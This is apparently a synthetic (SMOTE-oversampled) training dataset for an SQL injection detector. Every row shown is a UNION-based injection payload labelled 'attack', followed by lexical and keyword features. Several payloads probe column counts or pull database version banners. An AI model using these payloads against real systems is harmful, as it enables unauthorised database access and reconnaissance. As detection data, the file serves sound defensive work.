id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000308,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000022,4.399045949580527,76.47390037571179,28.947800751423575,4.38206815883297,30.9304010018981,26.526099624288214,11.491300125237263,7.5260996242882126,0.4035871393159213,0.347382608769519,0.15019394961708804,0.09883630229747176,2.4739003757117874,0.0,0.5086998747627374,0.0,0.0,0.4913001252372625,3.469446951953614e-18,0.5086998747627375,0.0,3.469446951953614e-18,3.03479949905095,1.0,1.0,0.0,0.0,0.5086998747627375,0.0,0.49130012523726246,0.5086998747627376,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,0.4913001252372625,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.491300125237262
SMOTE_000309,attack,union,"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",nearest_attack_euclidean,R000037,0.3188910990644537,57.420226552199814,20.857977344780018,3.9608242797101187,14.0,29.13618124175985,4.0,10.284045310439963,0.24462035396894008,0.5064555752372719,0.06989152970541145,0.17903254108837657,0.0,1.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,3.469446951953614e-18,5.284045310439963,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000310,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000071,0.40701710777043426,108.77244852416604,28.98204118066717,4.206139919285247,37.0,39.01795881933283,17.0,15.754489704833208,0.3402960523468274,0.3585348510095212,0.15635224026746125,0.14481685637619013,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,5.754489704833207,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,2.0,1.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000311,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000076,0.19444664825270636,82.84281678634596,27.23143664273081,4.145896982851189,29.0,27.074253429076766,15.0,11.76856335726919,0.3506367942721955,0.32603578153551505,0.18136385910630803,0.14196356508598143,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,2.7685633572691914,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000312,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000017,0.7703106453782571,75.13848172825179,32.27696345650357,4.406407177591821,43.72303654349643,2.1384817282517865,17.0,12.276963456503571,0.5819534288980972,0.02844020458989127,0.2262536509859157,0.16335271552609587,0.41544518475535674,0.0,2.0,0.0,1.8615182717482144,1.0,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,6.723036543496429,0.13848172825178562,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0,1.0,3.469446951953614e-18,0.13848172825178562,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.138481728251786
SMOTE_000313,attack,union,"-7001'+  (  select slav where 9321  =  9321 union all select 9321,9321,9321,9321,9321,9321,9321,9321,9321--",nearest_attack_euclidean,R000026,0.29550655948796223,105.89699208851628,27.0,4.059001766535466,28.50977426156279,47.5097742615628,15.122556434609303,14.754887130781395,0.2690762040263443,0.44864488134068636,0.14301532111152498,0.1392635935214443,1.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,7.877443565390697,4.877443565390697,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.8774435653906973,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.877443565390698
SMOTE_000314,attack,union," select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000010,5.330815315864778,77.74769756255732,23.152779293374365,3.9396034802758617,48.712970035747034,2.627316077811969,19.30555858674873,7.101852862249577,0.6328356292330345,0.026013030473385823,0.2486993484763307,0.09245199181724893,0.0,0.0,1.0509264311247886,0.0,1.0,1.5254632155623944,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,0.5254632155623944,4.6273160778119715,0.0,0.0,0.5254632155623944,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.5254632155623942,1.0,1.5254632155623942,1.5254632155623942,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.47453678443760583,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.050926431124788
SMOTE_000315,attack,union,"-1710""   )    )    as cvky where 1858  =  1858 union all select 1858,1858--",nearest_attack_euclidean,R000040,0.8362200370948624,81.22423043275883,26.792525652241373,3.8920290529943933,25.0,24.979384346207063,22.0,9.244846086551766,0.31357387164203543,0.29828180537274324,0.2759450070449912,0.11219931594023007,0.0,1.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,2.0,0.0,3.469446951953614e-18,2.2448460865517657,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000316,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000002,0.8743850725680836,102.34037015796407,26.0,4.0583797259323395,64.68074031592813,4.329814921017963,24.329814921017963,9.0,0.6318996272339681,0.04235407634653404,0.2377969867416815,0.08794930967781633,0.0,0.0,2.0,0.0,1.0,2.0,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,7.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.6701850789820346,2.0,1.0,1.9999999999999998,2.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000317,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000054,0.4517806288646886,74.16487478781822,28.83512521218178,4.318752518787416,29.0,20.0,15.0,10.164874787818222,0.39103038399158047,0.26967612689074516,0.20225709516805887,0.13703639394961553,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,1.0,5.164874787818222,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.16487478781822207,2.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000318,attack,union,"-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--",nearest_attack_euclidean,R000027,0.01311503890330393,80.01828334417003,27.99542916395749,4.312099378013965,29.0,24.018283344170037,15.0,12.0,0.36242109866355193,0.300152361201417,0.18745918896390618,0.14996735117112492,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,2.0045708360425087,5.995429163957491,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.995429163957491,2.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000319,attack,union,"-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--",nearest_attack_euclidean,R000028,0.35699973458549245,88.18324725859927,29.63664945171985,4.312908877014312,35.54659780687941,24.0,16.63664945171985,12.0,0.4022796741737464,0.27272250913800244,0.1886365621192499,0.13636125456900122,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,2.0,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,2.0,1.0,1.0,0.818324725859926,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.8183247258599256
SMOTE_000320,attack,union,"-7637"" union all select 8498,8498,8498--",nearest_attack_euclidean,R000059,1.433128234838585,46.57180224107971,20.41073764006748,4.044110514613086,14.0,20.92885168080978,4.0,7.642950560269928,0.3089262359932518,0.4410737640067482,0.0882646388552148,0.1617353611447852,0.0,1.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.41073764006748203,3.469446951953614e-18,3.232212920202446,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000321,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000076,0.6779156496502784,84.24153543890498,28.48792322805475,4.254308749892351,29.0,28.193228351123985,15.0,12.048307087780996,0.34919428871071817,0.32798565112206374,0.18061773554002664,0.14220232462719148,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,3.048307087780996,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000322,attack,union," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000013,1.3261635911205714,108.8749617653076,27.0,4.045790991339417,63.4687404413269,5.73437022066345,27.671851103317255,12.0,0.5833143213511414,0.05259033708578653,0.25375680759855634,0.11033853396451576,3.0,0.0,2.0,0.0,1.0,2.7343702206634513,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,6.265629779336549,1.0,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.2656297793365489,2.0,1.0,1.9999999999999998,2.0,3.469446951953614e-18,0.734370220663451,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.73437022066345
SMOTE_000323,attack,union,"-1876'||  (  select 'itfc' from dual where 9584  =  9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",nearest_attack_euclidean,R000068,0.07566457943387978,115.0,29.890240083284283,4.306806227627692,36.780480166568566,44.219519833431434,16.94512004164214,17.05487995835786,0.3198302623179875,0.384517563768969,0.147348869927323,0.1483033039857205,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,7.0548799583578585,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,2.0,1.0,1.0,0.9725600208210708,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.972560020821071
SMOTE_000324,attack,union,"-4869%' union all select 5729,5729,5729--",nearest_attack_euclidean,R000075,0.7103244506029199,44.680095447527165,21.263980910494567,4.133637455474974,14.0,18.944076358021732,4.0,7.736019089505433,0.31682384683626,0.41981138379648797,0.09052109909607428,0.17284367027117772,1.0,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,3.469446951953614e-18,2.736019089505433,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000325,attack,union,"-1606'||  (  select 'qbaa' where 3967  =  3967 union all select 3967,3967,3967,3967,3967--",nearest_attack_euclidean,R000067,0.22596117234262772,88.29397029190365,28.0,4.259869602943478,29.0,30.63517623352292,15.0,13.65879405838073,0.32909373076872145,0.3460776127327981,0.17022089522520073,0.1546077612732798,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,3.6587940583807304,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,2.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000326,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000069,1.4613383585364261,65.04293467384316,23.67620770529848,4.093761820938954,22.69767504222006,21.35241541059696,11.99284422102614,9.0,0.3418484432112301,0.32606725006116083,0.1910761781239918,0.1410081286036172,1.0,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,1.33094807367538,0.33094807367538004,3.469446951953614e-18,3.33810385264924,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000327,attack,union,"-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--",nearest_attack_euclidean,R000028,0.27674429389751315,87.9779840376612,29.73039787168816,4.307416493422245,35.92159148675264,23.46079574337632,16.73039787168816,11.86519893584408,0.40781597398729974,0.26666666666666666,0.19038667849062132,0.13513068085541227,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,1.8651989358440804,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,2.0,1.0,1.0,0.8651989358440804,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.86519893584408
SMOTE_000328,attack,union," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000004,0.8890565795569715,102.0,25.46059467938863,4.0419637108606326,66.0,4.0,24.0,8.0,0.6470588235294118,0.039215686274509776,0.23529411764705882,0.0784313725490196,0.0,0.0,2.0,0.0,1.539405320611369,2.0,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.9999999999999998,2.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000329,attack,union,"-7637"" union all select 8498,8498,8498--",nearest_attack_euclidean,R000059,0.17154325645796825,41.026714945801224,19.94866425270994,4.035070608750841,14.0,16.82137195664098,4.0,6.205342989160245,0.34401082948282613,0.40684476630534155,0.09828880842366462,0.15085559578816768,0.0,1.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,2.205342989160246,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000330,attack,union,"-1876'||  (  select 'itfc' from dual where 9584  =  9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",nearest_attack_euclidean,R000068,0.4268971162090716,111.94583229595607,30.610833540808787,4.344646392698352,37.0,41.55666583676486,17.0,16.389166459191216,0.3310976567328882,0.3704679047789558,0.1521259503907865,0.1463084880973695,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,6.389166459191214,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,2.0,1.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000331,attack,union,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",nearest_attack_euclidean,R000052,0.022795425363519195,89.84059089068799,26.968118178137598,4.027195859817946,25.0,31.872472712550394,22.0,10.9681181781376,0.278298722579451,0.3547220438728784,0.24490287586991688,0.12207635767775371,0.0,1.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,2.0,0.0,3.469446951953614e-18,3.9681181781375985,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000332,attack,union,"-7627%""   )    )    union all select 4011,4011,4011,4011,4011,4011,4011,4011,4011,4011--",nearest_attack_euclidean,R000072,0.4179318273442404,85.85780297805309,21.805254816186643,3.592406504579395,14.0,43.22101926474657,13.026274080933222,15.610509632373288,0.16425460714656623,0.5044260269048491,0.14950118413040295,0.18181818181818182,0.0,1.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,1.8052548161866444,1.0,3.469446951953614e-18,8.805254816186643,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9026274080933222,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000333,attack,union," select * from users where id  =  1 or 1#""; union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000020,5.267233218744899,79.62636960593377,30.927788796609274,4.209231769394818,42.518052800847684,3.0,21.14442240678145,12.963894398304637,0.5347280420759679,0.03774903157612536,0.2638439790130812,0.16367894733482555,2.4819471991523185,0.5180528008476817,2.0,0.0,1.0,1.0,0.5180528008476815,1.0361056016953634,0.0,3.469446951953614e-18,1.0,4.4819471991523185,1.0,0.5180528008476817,1.0,0.5180528008476816,0.0,1.0,0.5180528008476816,0.5180528008476815,0.0,0.0,0.0,2.0,1.0,1.0,1.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000334,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000008,2.7134350164298953,80.26114704988258,30.336783093823385,4.196879490399494,42.0,3.0,21.261147049882585,14.0,0.5245977167770883,0.037471265484077754,0.2630651121464712,0.17486590559236276,3.0,1.065286762470646,2.0,0.0,1.0,1.0,3.469446951953614e-18,1.065286762470646,0.0,3.469446951953614e-18,1.0,5.0,1.0,0.5326433812353228,1.0,0.0,0.0,1.0,0.532643381235323,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0,1.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000335,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000039,2.160330265111449,40.75886645727726,19.96555235103961,3.8404831217821385,14.0,9.931104702079214,10.896657053118824,5.931104702079216,0.3537842338223765,0.24239376728705594,0.2625094412670478,0.1413125576235198,0.4827761755198039,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,1.482776175519804,0.4827761755198039,3.469446951953614e-18,0.4827761755198039,3.0,0.4827761755198039,0.0,1.0,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000336,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000050,0.5930337940463921,91.84168670299536,25.168337340599074,4.038315965222886,27.0,40.673349362396294,11.0,13.168337340599074,0.2956885878368216,0.4407931229241574,0.12046572097055697,0.143052568268464,1.0,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,8.168337340599074,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000337,attack,union,"-5008' union all select 1942,1942,1942,1942,1942,1942,1942,1942--",nearest_attack_euclidean,R000055,0.467661843556255,65.1646211027984,20.83537889720159,3.8367976024170325,14.0,36.0,4.0,11.16462110279841,0.21484739034051803,0.552464718018475,0.06138496866871944,0.1713029229722877,1.0,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.16462110279841013,3.469446951953614e-18,7.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
